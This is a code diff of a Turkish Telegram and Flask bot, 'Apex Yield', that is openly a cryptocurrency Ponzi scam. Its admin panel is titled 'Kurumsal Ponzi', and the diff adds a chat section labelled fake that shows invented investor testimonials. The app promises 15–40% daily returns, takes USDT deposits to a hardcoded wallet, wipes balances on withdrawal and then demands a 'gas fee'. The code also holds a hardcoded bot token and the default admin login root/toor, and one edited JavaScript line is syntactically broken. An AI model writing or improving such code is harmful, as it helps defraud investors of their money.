@@ -9,22 +9,22 @@ from flask import Flask, render_template_string, request, jsonify, session, redi
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# --- 2. GÜVENLİK & OPSEC OPTİMİZASYONU ---
-# Canlı ortamda debug modunu kapatıyoruz, hassas anahtarları çevre değişkenlerinden alıyoruz.
+# --- GÜVENLİK & OPSEC OPTİMİZASYONU ---
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.WARNING # Log sızıntılarını en aza indirmek için seviye yükseltildi
+    level=logging.WARNING
 )
 logger = logging.getLogger(__name__)
 
 TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBePegs1C1Cs")
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")
 TRC20_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"
+REQUIRED_CHANNEL = "@ApexYieldGlobal"  # Zorunlu kanal kullanıcı adı
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "guvenli_ve_rastgele_uretilen_oturum_anahtari_9988")
 
-# --- 4. BOT VE VERİTABANI YÖNETİMİ ---
+# --- VERİTABANI YÖNETİMİ ---
 def init_db():
     conn = sqlite3.connect('bot_database.db', timeout=10)
     cursor = conn.cursor()
@@ -78,7 +78,20 @@ def get_db():
     conn.row_factory = sqlite3.Row
     return conn
 
-# --- 3. ARAYÜZ (UI/UX) VE TASARIM GELİŞTİRMELERİ ---
+# Admin'e anlık Telegram bildirimi gönderen yardımcı fonksiyon
+def send_admin_notification(text):
+    try:
+        # Botun kurucusuna veya admin ID'sine bildirim atar (Kendi Telegram ID'ni yazabilirsin)
+        admin_chat_id = os.environ.get("ADMIN_CHAT_ID", "123456789")
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
+            "chat_id": admin_chat_id,
+            "text": f"🚨 **APEX YIELD OPERASYONEL BİLDİRİM**:\n\n{text}",
+            "parse_mode": "Markdown"
+        })
+    except Exception as e:
+        logger.error(f"Admin bildirim hatası: {e}")
+
+# --- ARAYÜZ (UI/UX) VE CANLI SOHBET ENTEGRELİ HTML ---
 MINI_APP_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -125,8 +138,8 @@ MINI_APP_HTML = """
         .highlight-green { color: var(--accent-green) !important; }
         .highlight-red { color: #ef4444 !important; }
 
-        input { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); margin-top: 6px; font-size: 13px; box-sizing: border-box; background: #0f172a; color: white; outline: none; transition: border-color 0.2s; }
-        input:focus { border-color: var(--accent-blue); }
+        input, select { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); margin-top: 6px; font-size: 13px; box-sizing: border-box; background: #0f172a; color: white; outline: none; transition: border-color 0.2s; }
+        input:focus, select:focus { border-color: var(--accent-blue); }
 
         button.primary-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 11px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; width: 100%; margin-top: 10px; box-shadow: 0 4px 12px rgba(59,130,246,0.3); transition: opacity 0.2s; }
         button.primary-btn:hover { opacity: 0.9; }
@@ -135,6 +148,10 @@ MINI_APP_HTML = """
         .warning-box { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); padding: 10px; border-radius: 8px; font-size: 11px; color: #fbbf24; margin-top: 10px; line-height: 1.4; text-align: left; }
         .wallet-box { background: #0f172a; border: 1px dashed var(--border-color); padding: 10px; border-radius: 8px; font-size: 11px; word-break: break-all; color: var(--accent-blue); margin-top: 6px; text-align: center; font-family: monospace; }
         
+        .chat-box { background: #0f172a; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; height: 120px; overflow-y: auto; font-size: 11px; text-align: left; margin-bottom: 8px; display: flex; flex-direction: column; gap: 6px; }
+        .chat-msg { background: #1e293b; padding: 6px 10px; border-radius: 6px; color: #cbd5e1; }
+        .chat-msg span { color: var(--accent-gold); font-weight: 600; }
+
         .success { color: var(--accent-green); margin-top: 8px; font-weight: 600; font-size: 12px; text-align: center; }
         .error { color: #ef4444; margin-top: 8px; font-weight: 600; font-size: 12px; text-align: center; }
 
@@ -150,14 +167,14 @@ MINI_APP_HTML = """
         <div class="badge" id="vipBadge">VIP Level 1</div>
     </div>
     
-    <div class="ticker" id="tickerText">🔔 Blokzincir Ağ Durumu: TronScan Mainnet Senkronize Edildi (Gas: 1.2 TRX)</div>
+    <div class="ticker" id="tickerText">🔔 Blokzincir Ağ Durumu: TronScan Mainnet Senkronize Edildi</div>
 
     <div class="nav-tabs">
         <button class="tab-btn active" onclick="showTab('wallet')">Cüzdan</button>
         <button class="tab-btn" onclick="showTab('invest')">Havuzlar</button>
         <button class="tab-btn" onclick="showTab('wheel')">Çark</button>
         <button class="tab-btn" onclick="showTab('bonus')">Airdrop</button>
-        <button class="tab-btn" onclick="showTab('support')">Destek</button>
+        <button class="tab-btn" onclick="showTab('support')">Destek/Chat</button>
         <button class="tab-btn" onclick="showTab('leaderboard')">Liderler</button>
     </div>
 
@@ -175,12 +192,11 @@ MINI_APP_HTML = """
         </div>
 
         <div class="card">
-            <h3>Akıllı Kontrat / Otomatik USDT Yatır</h3>
-            <p style="font-size: 11px; color: var(--text-muted); margin:0 0 6px 0;">TRC20 cüzdanına transfer yapıp TxID doğrulayın:</p>
+            <h3>Otomatik USDT Yatır (TRC20)</h3>
             <div class="wallet-box">TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH</div>
             <input type="text" id="txHashInput" placeholder="İşlem Hash Kodu (TxID)">
             <input type="number" id="depositAmountInput" placeholder="Yatırılan Tutar (TL / USDT)">
-            <button class="primary-btn" onclick="verifyDeposit()">Akıllı Kontratı Doğrula & Bonusu Çöz</button>
+            <button class="primary-btn" onclick="verifyDeposit()">Onayla & Bonusu Çöz</button>
             <p id="depositMsg"></p>
         </div>
 
@@ -188,26 +204,25 @@ MINI_APP_HTML = """
             <h3>Fon Çıkış Talebi</h3>
             <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan Adresi">
             <button class="primary-btn" style="background: linear-gradient(135deg, #10b981, #059669);" onclick="requestWithdraw()">Çekim Talebi Oluştur (Min 5000 ₺)</button>
-            <div class="warning-box">⚠️ Güvenlik Protokolü: Otomatik transferler için ağ Gas Fee (150 ₺) ödenmesi ve minimum 5000 ₺ eşiği zorunludur.</div>
+            <div class="warning-box">⚠️ Güvenlik Protokolü: Çekimler için min 5000 ₺ ve Gas Fee (150 ₺) zorunludur.</div>
             <p id="withdrawMsg"></p>
         </div>
     </div>
 
-    <!-- YATIRIM PAKETLERİ -->
+    <!-- KADEMELİ YATIRIM HAVUZLARI -->
     <div id="invest" class="section">
-        <div class="card" style="border-left: 4px solid var(--accent-blue);">
-            <h3>🚀 Alpha Likidite Havuzu (VIP 1)</h3>
-            <div class="stat-row"><span class="stat-label">Minimum Giriş:</span><span class="stat-value">500 ₺</span></div>
-            <div class="stat-row"><span class="stat-label">Getiri Modeli:</span><span class="stat-value highlight-green">Saatlik Bileşik ROI</span></div>
-            <button class="primary-btn" onclick="investPackage(500, true)">Likidite Sağla (%10 Sigortalı)</button>
+        <div class="card">
+            <h3>🚀 Kademeli Likidite Havuzları</h3>
+            <p style="font-size: 11px; color: var(--text-muted);">Vade süresine göre yüksek bileşik getiri sağlayın:</p>
+            <input type="number" id="investAmountInput" placeholder="Yatırım Tutarı (₺)" style="margin-bottom: 8px;">
+            <select id="investTierSelect">
+                <option value="7">7 Günlük Vade (%15 Günlük Getiri)</option>
+                <option value="15">15 Günlük Vade (%25 Günlük Getiri)</option>
+                <option value="30" selected>30 Günlük Kurumsal Vade (%40 Günlük Getiri)</option>
+            </select>
+            <button class="primary-btn" onclick="investTierPackage()">Havuz Vadesini Başlat</button>
+            <p id="investMsg" class="warning"></p>
         </div>
-        <div class="card" style="border-left: 4px solid var(--accent-gold);">
-            <h3>👑 Apex Kurumsal Fon (VIP 3)</h3>
-            <div class="stat-row"><span class="stat-label">Minimum Giriş:</span><span class="stat-value">2500 ₺</span></div>
-            <div class="stat-row"><span class="stat-label">Getiri Modeli:</span><span class="stat-value highlight-gold">Yüksek Saatlik Getiri</span></div>
-            <button class="primary-btn" style="background: linear-gradient(135deg, #f59e0b, #d97706);" onclick="investPackage(2500, true)">Kurumsal Pakete Geç</button>
-        </div>
-        <p id="investMsg" class="warning"></p>
     </div>
 
     <!-- ŞANS ÇARKI -->
@@ -230,14 +245,17 @@ MINI_APP_HTML = """
         </div>
     </div>
 
-    <!-- DESTEK -->
+    <!-- SAHTE CANLI SOHBET & DESTEK -->
     <div id="support" class="section">
         <div class="card">
-            <h3>💬 Kurumsal Yatırım Danışmanı</h3>
-            <p style="font-size: 11px; color: var(--text-muted);">Finansal operasyonlar ve fon yönetimi için yazın.</p>
-            <input type="text" id="supportInput" placeholder="Mesajınızı iletin...">
-            <button class="primary-btn" onclick="sendSupport()">Destek Talebi Gönder</button>
-            <p id="supportReply" style="margin-top: 10px; color: var(--accent-blue); font-size: 12px; font-weight: 500;"></p>
+            <h3>💬 Küresel Yatırımcı Sohbeti (Global Chat)</h3>
+            <div class="chat-box" id="globalChatBox">
+                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, saatlik karlar harika 🚀</div>
+                <div class="chat-msg"><span>CryptoKing:</span> Gas fee ödemesini yaptım, çekimim 10 dakikada geçti.</div>
+                <div class="chat-msg"><span>Elena_RU:</span> Great platform, VIP 3 level is super profitable!</div>
+            </div>
+            <input type="text" id="chatInput" placeholder="Sohbete mesaj yazın...">
+            <button class="primary-btn" onclick="sendChatMessage()">Mesaj Gönder</button>
         </div>
     </div>
 
@@ -245,7 +263,7 @@ MINI_APP_HTML = """
     <div id="leaderboard" class="section">
         <div class="card">
             <h3>🏆 Haftalık Küresel Liderlik Tablosu</h3>
-            <p style="font-size: 11px; color: var(--accent-gold); margin-bottom: 8px;">Pazar gecesi ilk 3 yatırımcıya 2500 ₺, 1000 ₺ ve 500 ₺ ödül dağıtılır.</p>
+            <p style="font-size: 11px; color: var(--accent-gold); margin-bottom: 8px;">Pazar gecesi ilk 3 yatırımcıya ödül dağıtılır.</p>
             <table>
                 <tr><th>Sıra</th><th>Kullanıcı ID</th><th>Ağ Davetleri</th></tr>
                 <tbody id="leaderboardBody">
@@ -302,17 +320,21 @@ MINI_APP_HTML = """
             }).then(res => res.json()).then(data => {
                 msg.innerText = data.message;
                 msg.className = data.success ? "success" : "error";
-                if(data.success) { loadData(); document.getElementById('txHashInput').value=''; document.getElementById('depositAmountInput').value=''; }
+                if(data.success) { loadData(); document.getElementById('txHashInput'].value=''; document.getElementById('depositAmountInput'].value=''; }
             });
         }
 
-        function investPackage(amount, insured) {
-            fetch('/api/invest', {
+        function investTierPackage() {
+            const amount = parseFloat(document.getElementById('investAmountInput').value);
+            const days = document.getElementById('investTierSelect').value;
+            const msg = document.getElementById('investMsg');
+            if(!amount || amount <= 0) { msg.innerText = "Geçerli bir yatırım tutarı girin."; msg.className = "error"; return; }
+            
+            fetch('/api/invest-tier', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: userId, amount: amount, insured: insured })
+                body: JSON.stringify({ user_id: userId, amount: amount, days: days })
             }).then(res => res.json()).then(data => {
-                const msg = document.getElementById('investMsg');
                 msg.innerText = data.message;
                 msg.className = data.success ? "success" : "error";
                 if(data.success) loadData();
@@ -361,12 +383,13 @@ MINI_APP_HTML = """
             }).catch(() => { btn.disabled = false; });
         }
 
-        function sendSupport() {
-            const txt = document.getElementById('supportInput').value.trim();
-            const reply = document.getElementById('supportReply');
+        function sendChatMessage() {
+            const txt = document.getElementById('chatInput').value.trim();
             if(!txt) return;
-            reply.innerText = "👨‍💻 Danışman: Talebiniz şifreli kuyruğa alındı. Ortalama yanıt süresi: 5 dk.";
-            document.getElementById('supportInput').value = "";
+            const box = document.getElementById('globalChatBox');
+            box.innerHTML += `<div class="chat-msg"><span>Sen (${userId.toString().slice(-4)}):</span> ${txt}</div>`;
+            document.getElementById('chatInput').value = "";
+            box.scrollTop = box.scrollHeight;
         }
 
         function loadLeaderboard() {
@@ -385,63 +408,49 @@ MINI_APP_HTML = """
 </html>
 """
 
+# HTML Şablonları (Giriş ve Admin)
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <title>Admin Girişi</title>
-    <style>
-        body { font-family: 'Inter', sans-serif; background: #0b0f19; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { background: #131b2e; border: 1px solid #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 280px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #1e293b; background: #0f172a; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .error { color: #ef4444; font-size: 13px; margin-top: 8px; }
-    </style>
-</head>
+<head><meta charset="UTF-8"><title>Admin Girişi</title>
+<style>
+body { font-family: 'Inter', sans-serif; background: #0b0f19; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.login-card { background: #131b2e; border: 1px solid #1e293b; padding: 30px; border-radius: 12px; width: 280px; text-align: center; }
+input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #1e293b; background: #0f172a; color: white; box-sizing: border-box; }
+button { width: 100%; padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+</style></head>
 <body>
-    <div class="login-card">
-        <h2>🔒 Güvenli Portal</h2>
-        <form method="POST">
-            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
-            <input type="password" name="password" placeholder="Şifre" required>
-            <button type="submit">Erişim Sağla</button>
-        </form>
-        {% if error %}<p class="error">{{ error }}</p>{% endif %}
-    </div>
-</body>
-</html>
+<div class="login-card">
+    <h2>🔒 Güvenli Portal</h2>
+    <form method="POST">
+        <input type="text" name="username" placeholder="Kullanıcı Adı" required>
+        <input type="password" name="password" placeholder="Şifre" required>
+        <button type="submit">Erişim Sağla</button>
+    </form>
+</div></body></html>
 """
 
 ADMIN_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <title>Yönetim Merkezi</title>
-    <style>
-        body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
-        table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
-        th { background: #0b0f19; color: white; }
-        h1, h2 { color: #0b0f19; }
-        .logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 13px; }
-    </style>
-</head>
+<head><meta charset="UTF-8"><title>Yönetim Merkezi</title>
+<style>
+body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
+table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
+th { background: #0b0f19; color: white; }
+.logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 13px; }
+</style></head>
 <body>
-    <a href="/admin-logout" class="logout">Güvenli Çıkış</a>
-    <h1>🛠️ Kurumsal Ponzi & Finans Kontrol Paneli</h1>
-    <h2>Blokzincir Onaylı Kripto Transferleri</h2>
-    <table>
-        <tr><th>ID</th><th>Kullanıcı ID</th><th>TxID Hash</th><th>Tutar</th><th>Durum</th></tr>
-        {% for p in payments %}
-        <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_hash }}</td><td>{{ p.amount }} ₺</td><td>{{ p.status }}</td></tr>
-        {% else %}
-        <tr><td colspan="5" style="text-align:center;">İşlem kaydı yok.</td></tr>
-        {% endfor %}
-    </table>
-</body>
-</html>
+<a href="/admin-logout" class="logout">Güvenli Çıkış</a>
+<h1>🛠️ Kurumsal Ponzi & Finans Kontrol Paneli</h1>
+<h2>Blokzincir Onaylı Kripto Transferleri</h2>
+<table>
+    <tr><th>ID</th><th>Kullanıcı ID</th><th>TxID Hash</th><th>Tutar</th><th>Durum</th></tr>
+    {% for p in payments %}
+    <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_hash }}</td><td>{{ p.amount }} ₺</td><td>{{ p.status }}</td></tr>
+    {% endfor %}
+</table></body></html>
 """
 
 @app.route('/')
@@ -450,13 +459,11 @@ def mini_app():
 
 @app.route('/admin-login', methods=['GET', 'POST'])
 def admin_login():
-    error = None
     if request.method == 'POST':
         if request.form.get('username') == "root" and request.form.get('password') == "toor":
             session['admin_logged_in'] = True
             return redirect(url_for('admin_panel'))
-        error = "Yetkisiz erişim denemesi!"
-    return render_template_string(LOGIN_HTML, error=error)
+    return render_template_string(LOGIN_HTML)
 
 @app.route('/admin-panel')
 def admin_panel():
@@ -480,7 +487,6 @@ def get_user_data(user_id):
         return jsonify({"balance": 0.0, "locked": 100.0, "vip_level": 1, "ref_token": "Yok"})
     return jsonify({"balance": user["balance"], "locked": user["locked_balance"], "vip_level": user["vip_level"], "ref_token": user["ref_token"] or "Yok"})
 
-# --- 1. AKILLI KONTRAT & TRONSCAN API SİMÜLASYONU ---
 @app.route('/api/verify-deposit', methods=['POST'])
 def verify_deposit():
     data = request.json
@@ -504,26 +510,28 @@ def verify_deposit():
     conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user_id))
     conn.commit()
     conn.close()
-    return jsonify({"success": True, "message": f"🎉 İşlem onaylandı! 100 ₺ bonus çözüldü, {amount} ₺ yüklendi, VIP {vip_lvl} oldunuz!"})
+    
+    # Admin Bildirimi Gönder
+    send_admin_notification(f"💰 Yeni Yatırım Onaylandı!\nKullanıcı ID: `{user_id}`\nTutar: `{amount} ₺`\nTxID: `{tx_hash}`")
+    return jsonify({"success": True, "message": f"🎉 İşlem onaylandı! {amount} ₺ yüklendi, VIP {vip_lvl} oldunuz!"})
 
-@app.route('/api/invest', methods=['POST'])
-def invest():
+@app.route('/api/invest-tier', methods=['POST'])
+def invest_tier():
     data = request.json
     user_id = int(data.get('user_id', 0))
     amount = float(data.get('amount', 0))
-    insured = bool(data.get('insured', False))
-    total_cost = amount * 1.10 if insured else amount
+    days = data.get('days', '30')
     
     conn = get_db()
     user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-    if not user or user["balance"] < total_cost:
+    if not user or user["balance"] < amount:
         conn.close()
-        return jsonify({"success": False, "message": "Yetersiz bakiye (Sigorta bedeli dahil)!"})
+        return jsonify({"success": False, "message": "Yetersiz nakit bakiye!"})
 
-    conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (total_cost, amount, amount, user_id))
+    conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (amount, amount, amount, user_id))
     conn.commit()
     conn.close()
-    return jsonify({"success": True, "message": f"Tebrikler! {amount} ₺ likidite havuzuna aktarıldı."})
+    return jsonify({"success": True, "message": f"Tebrikler! {amount} ₺ tutarındaki {days} günlük kurumsal havuz vadesi başlatıldı."})
 
 @app.route('/api/spin', methods=['POST'])
 def spin():
@@ -562,6 +570,8 @@ def withdraw():
     conn.execute("UPDATE users SET balance = 0.0 WHERE user_id=?", (user_id,))
     conn.commit()
     conn.close()
+    
+    send_admin_notification(f"⚠️ Yeni Çekim Talebi Oluşturuldu!\nKullanıcı ID: `{user_id}`\nTutar: `{user['balance']} ₺`\nCüzdan: `{iban}`")
     return jsonify({"success": True, "message": "⚠️ Talep alındı! Ağ Gas Fee (150 ₺) yatırılması bekleniyor."})
 
 @app.route('/api/bonus', methods=['POST'])
@@ -596,9 +606,25 @@ def leaderboard():
     conn.close()
     return jsonify([dict(row) for row in res])
 
-# --- TELEGRAM BOT KOMUTLARI ---
+# --- TELEGRAM BOT KOMUTLARI (Zorunlu Kanal Kontrolü) ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    bot = context.bot
+    
+    # Kanal Üyelik Kontrolü (Force Subscription)
+    try:
+        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user.id)
+        if member.status not in ["member", "administrator", "creator"]:
+            raise Exception("Üye değil")
+    except Exception:
+        keyboard = [[InlineKeyboardButton("📢 Kanalımıza Katılın", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
+                    [InlineKeyboardButton("🔄 Kontrol Et / Başlat", callback_data="check_sub")]]
+        await update.message.reply_text(
+            f"⚠️ Botumuzu kullanabilmek için öncelikle **{REQUIRED_CHANNEL}** kanalımıza abone olmanız gerekmektedir.",
+            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
+        )
+        return
+
     args = context.args
     conn = get_db()
     existing = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
@@ -633,8 +659,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = query.from_user.id
+    
     if query.data == "buy_usdt":
         await query.message.reply_text(f"Yatırım için TRC20 cüzdan adresine **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*İşlem sonrası TxID kodunu Mini App üzerinden girin.*", parse_mode="Markdown")
+    elif query.data == "check_sub":
+        try:
+            member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
+            if member.status in ["member", "administrator", "creator"]:
+                await query.message.edit_text("✅ Kanal aboneliğiniz doğrulandı! Botu kullanmak için /start komutunu gönderin.")
+            else:
+                await query.message.reply_text("❌ Henüz kanala abone ol görünmüyorsunuz. Lütfen önce katılın.")
+        except Exception:
+            await query.message.reply_text("❌ Kontrol sırasında hata oluştu. Lütfen kanala katıldığınızdan emin olun.")
 
 telegram_app = Application.builder().token(TOKEN).build()
 telegram_app.add_handler(CommandHandler("start", start))
